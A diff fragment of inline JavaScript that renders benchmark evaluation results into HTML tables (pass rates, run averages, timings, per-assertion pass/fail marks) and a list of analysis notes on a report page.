+              html += "<td>" + configLabel + "</td>";
+              html += "<td>" + run.run_number + "</td>";
+              html += '<td class="' + prClass + '">' + ((r.pass_rate || 0) * 100).toFixed(0) + "% (" + (r.passed || 0) + "/" + (r.total || 0) + ")</td>";
+              if (hasTime) html += "<td>" + (r.time_seconds != null ? r.time_seconds.toFixed(1) : "—") + "</td>";
+              if (hasErrors) html += "<td>" + (r.errors || 0) + "</td>";
+              html += "</tr>";
+            }
+
+            // Average row
+            const rates = configRuns.map(r => (r.result || {}).pass_rate || 0);
+            const avgRate = rates.reduce((a, b) => a + b, 0) / rates.length;
+            const avgPrClass = avgRate >= 0.8 ? "benchmark-delta-positive" : avgRate < 0.5 ? "benchmark-delta-negative" : "";
+            html += '<tr class="benchmark-row-avg ' + rowClass + '">';
+            html += "<td>" + configLabel + "</td>";
+            html += "<td>Avg</td>";
+            html += '<td class="' + avgPrClass + '">' + (avgRate * 100).toFixed(0) + "%</td>";
+            if (hasTime) {
+              const times = configRuns.map(r => (r.result || {}).time_seconds).filter(t => t != null);
+              html += "<td>" + (times.length ? (times.reduce((a, b) => a + b, 0) / times.length).toFixed(1) : "—") + "</td>";
+            }
+            if (hasErrors) html += "<td></td>";
+            html += "</tr>";
+          }
+          html += "</tbody></table>";
+
+          // Per-assertion detail for this eval
+          const runsWithExpectations = {};
+          for (const config of configGroups) {
+            runsWithExpectations[config] = evalRuns.filter(r => r.configuration === config && r.expectations && r.expectations.length > 0);
+          }
+          const hasAnyExpectations = Object.values(runsWithExpectations).some(runs => runs.length > 0);
+          if (hasAnyExpectations) {
+            // Collect all unique assertion texts across all configs
+            const allAssertions = [];
+            const seen = new Set();
+            for (const config of configGroups) {
+              for (const run of runsWithExpectations[config]) {
+                for (const exp of (run.expectations || [])) {
+                  if (!seen.has(exp.text)) {
+                    seen.add(exp.text);
+                    allAssertions.push(exp.text);
+                  }
+                }
+              }
+            }
+
+            html += '<table class="benchmark-table" style="margin-top: 0.5rem;">';
+            html += "<thead><tr><th>Assertion</th>";
+            for (const config of configGroups) {
+              const label = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+              html += "<th>" + escapeHtml(label) + "</th>";
+            }
+            html += "</tr></thead><tbody>";
+
+            for (const assertionText of allAssertions) {
+              html += "<tr><td>" + escapeHtml(assertionText) + "</td>";
+
+              for (const config of configGroups) {
+                html += "<td>";
+                for (const run of runsWithExpectations[config]) {
+                  const exp = (run.expectations || []).find(e => e.text === assertionText);
+                  if (exp) {
+                    const cls = exp.passed ? "benchmark-delta-positive" : "benchmark-delta-negative";
+                    const icon = exp.passed ? "\u2713" : "\u2717";
+                    html += '<span class="' + cls + '" title="Run ' + run.run_number + ': ' + escapeHtml(exp.evidence || "") + '">' + icon + "</span> ";
+                  } else {
+                    html += "— ";
+                  }
+                }
+                html += "</td>";
+              }
+              html += "</tr>";
+            }
+            html += "</tbody></table>";
+          }
+        }
+      }
+
+      // Notes
+      if (notes.length > 0) {
+        html += '<div class="benchmark-notes">';
+        html += "<h3>Analysis Notes</h3>";
+        html += "<ul>";
+        for (const note of notes) {
+          html += "<li>" + escapeHtml(note) + "</li>";
+        }
+        html += "</ul></div>";
+      }
+
+      container.innerHTML = html;
+    }
+
+    // ---- Start ----
+    init();
+    renderBenchmark();
+  </script>
+</body>
+</html>
